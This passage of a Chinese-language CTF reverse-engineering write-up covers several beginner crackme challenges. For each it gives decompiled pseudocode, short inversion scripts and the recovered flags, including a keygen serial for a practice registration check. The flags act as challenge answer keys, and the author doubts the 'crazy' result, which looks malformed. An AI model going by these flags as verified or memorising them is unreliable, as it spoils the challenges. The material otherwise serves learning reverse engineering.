[rsp+A7h] [rbp-19h]  int v14; // [rsp+A8h] [rbp-18h]  int v15; // [rsp+ACh] [rbp-14h]  unsigned int v16; // [rsp+B0h] [rbp-10h]  int v17; // [rsp+B4h] [rbp-Ch]  _BOOL4 v18; // [rsp+B8h] [rbp-8h]  int i; // [rsp+BCh] [rbp-4h]  printf((unsigned __int64)&quot;Give me the password: &quot;);  scanf((__int64)&quot;%s&quot;, v8, a2);  for ( i = 0; v8[i]; ++i )    ;  v18 = i == 22;  v17 = 10;  do  {    index = rand((__int64)&quot;%s&quot;, (__int64)v8, v2, v3, v4, v5);    v3 = (unsigned int)(index % 22);    v14 = index % 22;    v16 = 0;    v13 = byte_6B4270[index % 22];    v12 = v8[index % 22];    v11 = index % 22 + 1;    v15 = 0;    while ( v15 &lt; v11 )    {      ++v15;      v16 = 1828812941 * v16 + 12345;    }    v2 = v16;    v10 = v16 ^ v12;    if ( v13 != ((unsigned __int8)v16 ^ v12) )      v18 = 0;    --v17;  }  while ( v17 );  if ( v18 )    v9 = printf((unsigned __int64)&quot;Congras\n&quot;);  else    v9 = printf((unsigned __int64)&quot;Oh no!\n&quot;);  return 0LL;}</code></pre><p>就是个简单的运算，写个脚本逆运算一下就出来了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() {    unsigned char byte_6B4270[] =            {                    95, 242,  94, 139,  78,  14, 163, 170, 199, 147,                    129,  61,  95, 116, 163,   9, 145,  43,  73,  40,                    147, 103            };    char v13;    char v12;    char v8[23];    unsigned int v16=0;    for(int i=0;i&lt;22;i++)    {        v16=0;        v13=byte_6B4270[i];        int v11=i+1;        int v15=0;        while(v15&lt;v11){            ++v15;            v16=1828812941 * v16 + 12345;        }        v8[i]=v13^v16;    }    cout&lt;&lt;v8&lt;&lt;endl;    return 0;}</code></pre><p>输出flag</p><pre><code>flag{d826e6926098ef46}</code></pre><h4 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h4><p>还是通过字符串找到关键函数</p><pre><code class="c++">int sub_401080(){  unsigned int v0; // kr00_4  signed int v1; // edx  char *v2; // esi  char v3; // al  unsigned int v4; // edx  int v5; // eax  __int128 v7; // [esp+2h] [ebp-24h]  __int64 v8; // [esp+12h] [ebp-14h]  int v9; // [esp+1Ah] [ebp-Ch]  __int16 v10; // [esp+1Eh] [ebp-8h]  printf(&quot;input：&quot;, v7);  v9 = 0;  v10 = 0;  v7 = 0i64;  v8 = 0i64;  scanf((const char *)&amp;dword_402158, (unsigned int)&amp;v7);  v0 = strlen((const char *)&amp;v7);  if ( v0 &gt;= 16 &amp;&amp; v0 == 24 )                   // flag共24位  {    v1 = 0;    v2 = (char *)&amp;v8 + 7;    do    {      v3 = *v2--;      byte_40336C[v1++] = v3;                   // 输入的flag倒序    }    while ( v1 &lt; 24 );    v4 = 0;    do    {      byte_40336C[v4] = (byte_40336C[v4] + 1) ^ 6;      ++v4;    }    while ( v4 &lt; 24 );    v5 = strcmp(byte_40336C, &quot;xIrCj~&lt;r|2tWsv3PtI\x7Fzndka&quot;);    if ( v5 )      v5 = -(v5 &lt; 0) | 1;    if ( !v5 )    {      printf(&quot;right\n&quot;, v7);      system(&quot;pause&quot;);    }  }  return 0;}</code></pre><p>里面的算法变得复杂而毫无意义，真正实现的功能就两个，首先将输入的字符串逆序，然后进行一个变换，最后得到已知的字符串</p><pre><code class="python">target=&#39;xIrCj~&lt;r|2tWsv3PtI\x7Fzndka&#39;flag=&#39;&#39;for i in target:    flag+=chr((ord(i)^6)-1)print(flag[::-1])</code></pre><p>输出flag</p><pre><code>flag{xNqU4otPq3ys9wkDsN}</code></pre><h4 id="shuffle"><a href="#shuffle" class="headerlink" title="shuffle"></a>shuffle</h4><p>打开把所有的整数转换为字符就看到了flag</p><pre><code>SECCON{Welcome to the SECCON 2014 CTF!}</code></pre><h4 id="re-for-50-plz-50"><a href="#re-for-50-plz-50" class="headerlink" title="re-for-50-plz-50"></a>re-for-50-plz-50</h4><p>这题是MIPS，IDA直接反编译不出来，MIPS指令学的也不是很好，所以直接用retdec插件</p><p>retdec直接反编译出来</p><pre><code class="c++">int main(int argc, char ** argv) {    // 0x401398    for (int32_t i = 0; i &lt; 31; i++) {        char v1 = *(char *)(i + (int32_t)&quot;cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ&quot;); // 0x4013d8        char v2 = *(char *)(*(int32_t *)((int32_t)argv + 4) + i); // 0x4013f0        if ((int32_t)v1 != ((int32_t)v2 ^ 55)) {            // 0x401408            print();            exit_funct();        }    }    // 0x401444    exit_funct();    return 1;}</code></pre><p>可以发现只有一个异或操作</p><pre><code class="python">target=&quot;cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ&quot;flag=&#39;&#39;for i in target:    flag+=chr((ord(i)^55))print(flag)</code></pre><p>输出flag</p><pre><code>TUCTF{but_really_whoisjohngalt}</code></pre><h4 id="parallel-comparator-200"><a href="#parallel-comparator-200" class="headerlink" title="parallel-comparator-200"></a>parallel-comparator-200</h4><p>代码审计，直接给出了源码</p><pre><code class="c++">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#define FLAG_LEN 20void * checking(void *arg) {    char *result = malloc(sizeof(char));    char *argument = (char *)arg;    *result = (argument[0]+argument[1]) ^ argument[2];    return result;}int highly_optimized_parallel_comparsion(char *user_string){    int initialization_number;    int i;    char generated_string[FLAG_LEN + 1];    generated_string[FLAG_LEN] = &#39;\0&#39;;    while ((initialization_number = random()) &gt;= 64);    int first_letter;    first_letter = (initialization_number % 26) + 97;    pthread_t thread[FLAG_LEN];    char differences[FLAG_LEN] = {0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7};    char *arguments[20];    for (i = 0; i &lt; FLAG_LEN; i++) {        arguments[i] = (char *)malloc(3*sizeof(char));        arguments[i][0] = first_letter;        arguments[i][1] = differences[i];        arguments[i][2] = user_string[i];        pthread_create((pthread_t*)(thread+i), NULL, checking, arguments[i]);    }    void *result;    int just_a_string[FLAG_LEN] = {115, 116, 114, 97, 110, 103, 101, 95, 115, 116, 114, 105, 110, 103, 95, 105, 116, 95, 105, 115};    for (i = 0; i &lt; FLAG_LEN; i++) {        pthread_join(*(thread+i), &amp;result);        generated_string[i] = *(char *)result + just_a_string[i];        free(result);        free(arguments[i]);    }    int is_ok = 1;    for (i = 0; i &lt; FLAG_LEN; i++) {        if (generated_string[i] != just_a_string[i])            return 0;    }    return 1;}int main(){    char *user_string = (char *)calloc(FLAG_LEN+1, sizeof(char));    fgets(user_string, FLAG_LEN+1, stdin);    int is_ok = highly_optimized_parallel_comparsion(user_string);    if (is_ok)        printf(&quot;You win!\n&quot;);    else        printf(&quot;Wrong!\n&quot;);    return 0;}</code></pre><p>源码比较长，但是做的事情不多，需要注意三个函数的用法</p><p>第一个是<code>pthread_create()</code>用来创建一个新的线程</p><pre><code class="c++">int pthread_create(pthread_t *tidp,const pthread_attr_t *attr,(void*)(*start_rtn)(void*),void *arg);</code></pre><p>几个参数分别是，指向线程的指针，线程的属性，调用的函数和参数，在这段代码里实际上就是调用<code>checking()</code>函数，并把之前设定好的参数传给函数</p><p>第二个是<code>pthread_join()</code>用来传递返回结果</p><pre><code class="c++">int pthread_join(pthread_t thread, void **retval);</code></pre><p>所以result就是指向返回结果的指针，所以最终的目的就是让<code>checking()</code>函数返回的值为0</p><p>第三个是<code>random()</code>函数，在这之前没有用随机种子初始化生成器，所以随机数生成的结果不管怎么运行都是一样的，但是需要注意linux下<code>random()</code>和windows下<code>rand()</code>生成的数据并不一样</p><p>此外还需要注意一点，在c++里面，赋值语句的返回值是赋的值而不是布尔值</p><p>所以只需要根据<code>checking()</code>函数来逆向运算一下就可以得到结果了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;#define FLAG_LEN 20using namespace std;int main() {    char differences[FLAG_LEN] = {0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7};    int first_letter;    first_letter = 108;    char flag[FLAG_LEN];    for (int i = 0; i &lt; FLAG_LEN; i++) {        flag[i] = first_letter + differences[i];    }    cout &lt;&lt; flag &lt;&lt; endl;    return 0;}</code></pre><p>输出flag</p><pre><code>lucky_hacker_you_are</code></pre><h4 id="secret-galaxy-300"><a href="#secret-galaxy-300" class="headerlink" title="secret-galaxy-300"></a>secret-galaxy-300</h4><p>题目里面只有一个结构体，运行了一遍什么都没发现，OD调试的时候查找字符串找到flag</p><pre><code>aliens_are_around_us</code></pre><h4 id="srm-50"><a href="#srm-50" class="headerlink" title="srm-50"></a>srm-50</h4><p>这题是个简单的注册机，找到关键函数</p><pre><code class="c++">BOOL __stdcall DialogFunc(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4){  HMODULE v5; // eax  HICON v6; // eax  HMODULE v7; // eax  HCURSOR v8; // ST20_4  HWND v9; // eax  CHAR String; // [esp+8h] [ebp-340h]  CHAR v11[4]; // [esp+108h] [ebp-240h]  char v12; // [esp+10Ch] [ebp-23Ch]  char v13; // [esp+10Dh] [ebp-23Bh]  char v14; // [esp+10Eh] [ebp-23Ah]  char v15; // [esp+10Fh] [ebp-239h]  char v16; // [esp+110h] [ebp-238h]  char v17; // [esp+111h] [ebp-237h]  char v18; // [esp+112h] [ebp-236h]  char v19; // [esp+113h] [ebp-235h]  char v20; // [esp+114h] [ebp-234h]  char v21; // [esp+115h] [ebp-233h]  char v22; // [esp+116h] [ebp-232h]  char v23; // [esp+117h] [ebp-231h]  CHAR Text; // [esp+208h] [ebp-140h]  char Src[16]; // [esp+308h] [ebp-40h]  __int128 v26; // [esp+318h] [ebp-30h]  int v27; // [esp+328h] [ebp-20h]  __int128 v28; // [esp+32Ch] [ebp-1Ch]  int v29; // [esp+33Ch] [ebp-Ch]  __int16 v30; // [esp+340h] [ebp-8h]  if ( a2 == 16 )  {    EndDialog(hDlg, 0);    return 0;  }  if ( a2 == 272 )  {    v5 = GetModuleHandleW(0);    v6 = LoadIconW(v5, (LPCWSTR)0x67);    SetClassLongA(hDlg, -14, (LONG)v6);    v7 = GetModuleHandleW(0);    v8 = LoadCursorW(v7, (LPCWSTR)0x66);    v9 = GetDlgItem(hDlg, 1);    SetClassLongA(v9, -12, (LONG)v8);    return 1;  }  if ( a2 != 273 || (unsigned __int16)a3 != 1 )    return 0;  memset(&amp;String, (unsigned __int16)a3 - 1, 0x100u);  memset(v11, 0, 0x100u);  memset(&amp;Text, 0, 0x100u);  GetDlgItemTextA(hDlg, 1001, &amp;String, 256);  GetDlgItemTextA(hDlg, 1002, v11, 256);  if ( strstr(&amp;String, &quot;@&quot;) &amp;&amp; strstr(&amp;String, &quot;.&quot;) &amp;&amp; strstr(&amp;String, &quot;.&quot;)[1] &amp;&amp; strstr(&amp;String, &quot;@&quot;)[1] != 46 )  {    v28 = xmmword_410AA0;    v29 = 1701999980;    *(_OWORD *)Src = xmmword_410A90;    v30 = 46;    v26 = xmmword_410A80;    v27 = 3830633;    if ( strlen(v11) != 16      || v11[0] != 67      || v23 != 88      || v11[1] != 90      || v11[1] + v22 != 155      || v11[2] != 57      || v11[2] + v21 != 155      || v11[3] != 100      || v20 != 55      || v12 != 109      || v19 != 71      || v13 != 113      || v13 + v18 != 170      || v14 != 52      || v17 != 103      || v15 != 99      || v16 != 56 )    {      strcpy_s(&amp;Text, 0x100u, (const char *)&amp;v28);    }    else    {      strcpy_s(&amp;Text, 0x100u, Src);      strcat_s(&amp;Text, 0x100u, v11);    }  }  else  {    strcpy_s(&amp;Text, 0x100u, &quot;Your E-mail address in not valid.&quot;);  }  MessageBoxA(hDlg, &amp;Text, &quot;Registeration&quot;, 0x40u);  return 1;}</code></pre><p>过程十分简单，先简单判断邮箱是不是符合格式，如果符合进入序列号的判断，序列号的判断关键也就只有一个if条件，然后就会输出注册有没有成功</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() {    char v11[17]={0};    v11[0] = &#39;C&#39;;    v11[15] = &#39;X&#39;;    v11[1] = &#39;Z&#39;;    v11[14] = 155-v11[1];    v11[2] = 57;     v11[13] = 155-v11[2];    v11[3] = 100;    v11[12] = 55;    v11[4] = 109;    v11[11] = 71;    v11[5] = 113;    v11[10] = 170-v11[5];    v11[6] = 52;    v11[9] = 103;    v11[7] = 99;    v11[8] = 56;    cout&lt;&lt;v11&lt;&lt;endl;    return 0;}</code></pre><p>输出结果为</p><pre><code>CZ9dmq4c8g9G7bAX</code></pre><h4 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h4><p>通过字符串找到关键函数</p><pre><code class="c++">int __stdcall sub_401090(HWND hWnd, int a2, int a3, int a4){  char v5; // [esp+50h] [ebp-310h]  CHAR Text[4]; // [esp+154h] [ebp-20Ch]  char v7; // [esp+159h] [ebp-207h]  __int16 v8; // [esp+255h] [ebp-10Bh]  char v9; // [esp+257h] [ebp-109h]  int v10; // [esp+258h] [ebp-108h]  CHAR String; // [esp+25Ch] [ebp-104h]  char v12; // [esp+25Fh] [ebp-101h]  char v13; // [esp+260h] [ebp-100h]  char v14; // [esp+261h] [ebp-FFh]  memset(&amp;String, 0, 0x104u);  v10 = 0;  if ( a2 == 16 )  {    DestroyWindow(hWnd);    PostQuitMessage(0);  }  else if ( a2 == 273 )  {    if ( a3 == 1000 )    {      GetDlgItemTextA(hWnd, 1002, &amp;String, 260);      strlen(&amp;String);      if ( strlen(&amp;String) &gt; 6 )        ExitProcess(0);      v10 = atoi(&amp;String) + 1;      if ( v10 == 123 &amp;&amp; v12 == &#39;x&#39; &amp;&amp; v14 == &#39;z&#39; &amp;&amp; v13 == &#39;y&#39; )      {        strcpy(Text, &quot;flag&quot;);        memset(&amp;v7, 0, 0xFCu);        v8 = 0;        v9 = 0;        _itoa(v10, &amp;v5, 10);        strcat(Text, &quot;{&quot;);        strcat(Text, &amp;v5);        strcat(Text, &quot;_&quot;);        strcat(Text, &quot;Buff3r_0v3rf|0w&quot;);        strcat(Text, &quot;}&quot;);        MessageBoxA(0, Text, &quot;well done&quot;, 0);      }      SetTimer(hWnd, 1u, 0x3E8u, TimerFunc);    }    if ( a3 == 1001 )      KillTimer(hWnd, 1u);  }  return 0;}</code></pre><p>发现我们只要输入122xyz，就会输出flag，而且flag也可以直接拼凑出来</p><pre><code>flag{123_Buff3r_0v3rf|0w}</code></pre><h4 id="re1-100"><a href="#re1-100" class="headerlink" title="re1-100"></a>re1-100</h4><p>这题题目里面的if实在是太多了，主要是为了判断是不是有debugger，所以不能通过调试的方式获得flag，所以还是要研究一下代码</p><pre><code class="c++">if ( strlen(bufParentRead) == 42 )          {            if ( !strncmp(&amp;bufParentRead[1], &quot;53fc275d81&quot;, 10uLL) )            {              if ( bufParentRead[strlen(bufParentRead) - 1] == &#39;}&#39; )              {                if ( !strncmp(&amp;bufParentRead[31], &quot;4938ae4efd&quot;, 10uLL) )                {                  if ( !confuseKey(bufParentRead, 42) )                  {                    responseFalse();                  }                  else if ( !strncmp(bufParentRead, &quot;{daf29f59034938ae4efd53fc275d81053ed5be8c}&quot;, 42uLL) )                  {                    responseTrue();                  }                  else                  {                    responseFalse();                  }                }                else                {                  responseFalse();                }              }              else              {                responseFalse();              }            }            else            {              responseFalse();            }</code></pre><p>截取了其中一段，这里把flag分成了4个部分，每段10个字符，已经知道第一段地最后一段，但是也知道经过<code>confuseKey()</code>之后flag是什么，所以我们只要研究一下<code>confusekey()</code>就可以了</p><pre><code class="c++">bool __cdecl confuseKey(char *szKey, int iKeyLength){  char szPart1[15]; // [rsp+10h] [rbp-50h]  char szPart2[15]; // [rsp+20h] [rbp-40h]  char szPart3[15]; // [rsp+30h] [rbp-30h]  char szPart4[15]; // [rsp+40h] [rbp-20h]  unsigned __int64 v7; // [rsp+58h] [rbp-8h]  v7 = __readfsqword(0x28u);  *(_QWORD *)szPart1 = 0LL;  *(_DWORD *)&amp;szPart1[8] = 0;  *(_WORD *)&amp;szPart1[12] = 0;  szPart1[14] = 0;  *(_QWORD *)szPart2 = 0LL;  *(_DWORD *)&amp;szPart2[8] = 0;  *(_WORD *)&amp;szPart2[12] = 0;  szPart2[14] = 0;  *(_QWORD *)szPart3 = 0LL;  *(_DWORD *)&amp;szPart3[8] = 0;  *(_WORD *)&amp;szPart3[12] = 0;  szPart3[14] = 0;  *(_QWORD *)szPart4 = 0LL;  *(_DWORD *)&amp;szPart4[8] = 0;  *(_WORD *)&amp;szPart4[12] = 0;  szPart4[14] = 0;  if ( iKeyLength != 42 )    return 0;  if ( !szKey )    return 0;  if ( strlen(szKey) != 42 )    return 0;  if ( *szKey != &#39;{&#39; )    return 0;  strncpy(szPart1, szKey + 1, 0xAuLL);  strncpy(szPart2, szKey + 11, 0xAuLL);  strncpy(szPart3, szKey + 21, 0xAuLL);  strncpy(szPart4, szKey + 31, 0xAuLL);  memset(szKey, 0, iKeyLength);  *szKey = 123;  strcat(szKey, szPart3);  strcat(szKey, szPart4);  strcat(szKey, szPart1);  strcat(szKey, szPart2);  szKey[41] = 125;  return 1;}</code></pre><p>内容挺多，实际上只实现了一件事情，把四段调换了一个顺序，变成了3421的顺序，所以调整一下顺序就出来了</p><pre><code>53fc275d81053ed5be8cdaf29f59034938ae4efd</code></pre><h4 id="crazy"><a href="#crazy" class="headerlink" title="crazy"></a>crazy</h4><p>这题c++17编写，还有类，乍一看有点复杂，但实际上不是很难</p><p>还是先看关键函数，这里在main函数里就进行了处理</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // rax  __int64 v4; // rax  __int64 v5; // rax  __int64 v6; // rax  __int64 v7; // rax  __int64 v8; // rax  __int64 v9; // rax  __int64 v10; // rax  __int64 v11; // rax  __int64 v12; // rax  __int64 v13; // rax  __int64 v14; // rax  __int64 v15; // rax  __int64 v16; // rax  char v18; // [rsp+10h] [rbp-130h]  char v19; // [rsp+30h] [rbp-110h]  char v20; // [rsp+50h] [rbp-F0h]  char v21; // [rsp+70h] [rbp-D0h]  char v22; // [rsp+90h] [rbp-B0h]  char v23; // [rsp+B0h] [rbp-90h]  unsigned __int64 v24; // [rsp+128h] [rbp-18h]  v24 = __readfsqword(0x28u);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v18, argv, envp);  std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;v18);  v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------------------------&quot;);  std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Quote from people&#39;s champ&quot;);  std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------------------------&quot;);  std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(         &amp;std::cout,         &quot;*My goal was never to be the loudest or the craziest. It was to be the most entertaining.&quot;);  std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;*Wrestling was like stand-up comedy for me.&quot;);  std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v8 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(         &amp;std::cout,         &quot;*I like to use the hard times in the past to motivate me today.&quot;);  std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v9 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------------------------&quot;);  std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  HighTemplar::HighTemplar((DarkTemplar *)&amp;v23, (__int64)&amp;v18);  v10 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Checking....&quot;);  std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v19, &amp;v18);  func1((__int64)&amp;v20, (__int64)&amp;v19);  func2((__int64)&amp;v21, (__int64)&amp;v20);  func3((__int64)&amp;v21, 0);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v21);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v20);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v19);  HighTemplar::calculate((HighTemplar *)&amp;v23);  if ( (unsigned int)HighTemplar::getSerial((HighTemplar *)&amp;v23) == 0 )  {    v11 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;/////////////////////////////////&quot;);    std::ostream::operator&lt;&lt;(v11, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v12 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Do not be angry. Happy Hacking :)&quot;);    std::ostream::operator&lt;&lt;(v12, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v13 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;/////////////////////////////////&quot;);    std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    ZN11HighTemplar7getFlagB5cxx11Ev((__int64)&amp;v22, (__int64)&amp;v23);    v14 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;flag{&quot;);    v15 = std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(v14, &amp;v22);    v16 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v15, &quot;}&quot;);    std::ostream::operator&lt;&lt;(v16, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v22);  }  HighTemplar::~HighTemplar((HighTemplar *)&amp;v23);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v18);  return 0;}</code></pre><p>乍一看很复杂，慢慢分析，发现了一个输入，被赋值给了<code>v18</code>，然后发现一个类的构造函数调用了我们输入的字符串，可以理解为，用我们的字符串初始化了类中的数据成员，进去仔细看看</p><pre><code class="c++">nsigned __int64 __fastcall HighTemplar::HighTemplar(DarkTemplar *a1, __int64 a2){  char v3; // [rsp+17h] [rbp-19h]  unsigned __int64 v4; // [rsp+18h] [rbp-18h]  v4 = __readfsqword(0x28u);  DarkTemplar::DarkTemplar(a1);  *(_QWORD *)a1 = &amp;off_401EA0;  *((_DWORD *)a1 + 3) = 0;  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string((char *)a1 + 16, a2);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string((char *)a1 + 48, a2);  std::allocator&lt;char&gt;::allocator(&amp;v3, a2);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(    (char *)a1 + 80,    &quot;327a6c4304ad5938eaf0efb6cc3e53dc&quot;,    &amp;v3);  std::allocator&lt;char&gt;::~allocator(&amp;v3);  return __readfsqword(0x28u) ^ v4;}</code></pre><p>从这里看，类里面至少应该有一个<code>getSerial()</code>函数在<code>off_401EA0</code>处，三个字符串，偏移量分别为16，48，80，长度都是32位，还有一个布尔型变量，偏移量位3，并且我们还知道，我们的数据被传入了一个变量<code>v23</code>里，然后返回去，跟踪<code>v23</code>，找到剩下的关键函数</p><pre><code class="c++">bool __fastcall HighTemplar::calculate(HighTemplar *this){  __int64 v1; // rax  _BYTE *v2; // rbx  bool result; // al  _BYTE *v4; // rbx  int i; // [rsp+18h] [rbp-18h]  int j; // [rsp+1Ch] [rbp-14h]  if ( std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16) != 32 )  {    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Too short or too long&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    exit(-1);  }  for ( i = 0;        i &lt;= (unsigned __int64)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16);        ++i )  {    v2 = (_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                    (char *)this + 16,                    i);    *v2 = (*(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                       (char *)this + 16,                       i) ^ 0x50)        + 23;  }  for ( j = 0; ; ++j )  {    result = j &lt;= (unsigned __int64)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16);    if ( !result )      break;    v4 = (_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                    (char *)this + 16,                    j);    *v4 = (*(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                       (char *)this + 16,                       j) ^ 0x13)        + 11;  }  return result;}</code></pre><p>这一看就是个加密函数，并且只对偏移量位16处的字符串进行了操作，这里正好是我们输入的字符串，虽然有两个for循环，但是都是对同一个字符串的同一个位置进行操作，很好逆向，加密完之后应该还会有一个验证，找到下面的验证函数</p><pre><code class="c++">__int64 __fastcall HighTemplar::getSerial(HighTemplar *this){  __int64 v1; // rbx  __int64 v2; // rax  __int64 v3; // rax  __int64 v4; // rax  __int64 v5; // rax  unsigned int i; // [rsp+1Ch] [rbp-14h]  for ( i = 0;        (signed int)i &lt; (unsigned __int64)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16);        ++i )  {    v1 = *(unsigned __int8 *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                               (char *)this + 80,                               (signed int)i);    if ( (_BYTE)v1 != *(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                                  (char *)this + 16,                                  (signed int)i) )    {      v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;You did not pass &quot;);      v5 = std::ostream::operator&lt;&lt;(v4, i);      std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);      *((_DWORD *)this + 3) = 1;      return *((unsigned int *)this + 3);    }    v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Pass &quot;);    v3 = std::ostream::operator&lt;&lt;(v2, i);    std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  }  return *((unsigned int *)this + 3);}</code></pre><p>这个函数不长，很简单的验证了加密过后的字符串和偏移量位80的字符串是不是一样，用偏移量位3处的布尔值作为返回值，如果相同返回0，回到主函数，接下来就成功了，没有其他的变换和判断，所以这个程序实际上非常简单</p><pre><code class="python">target = &quot;327a6c4304ad5938eaf0efb6cc3e53dc&quot;flag = &#39;&#39;for i in target:    flag += chr((((ord(i) - 11) ^ 0x13) - 23) ^ 0x50)print(flag)</code></pre><p>很简单就可以逆向出，套上<code>flag{}</code>提交即可（这个flag长得实在不像是正确的）</p><pre><code>flag{tMx~qdstOs~crvtwb~aOba}qddtbrtcd}</code></pre><h4 id="re4-unvm-me"><a href="#re4-unvm-me" class="headerlink" title="re4-unvm-me"></a>re4-unvm-me</h4><p>pyc格式，直接uncompyle6反编译，成功，没有对pyc文件动什么手脚，反编译后的源代码如下</p><pre><code class="python">import md5md5s = [ 174282896860968005525213562254350376167, 137092044126081477479435678296496849608, 126300127609096051658061491018211963916, 314989972419727999226545215739316729360, 256525866025901597224592941642385934114, 115141138810151571209618282728408211053, 8705973470942652577929336993839061582, 256697681645515528548061291580728800189, 39818552652170274340851144295913091599, 65313561977812018046200997898904313350, 230909080238053318105407334248228870753, 196125799557195268866757688147870815374, 74874145132345503095307276614727915885]print &#39;Can you turn me back to python ? ...&#39;flag = raw_input(&#39;well as you wish.. what is the flag: 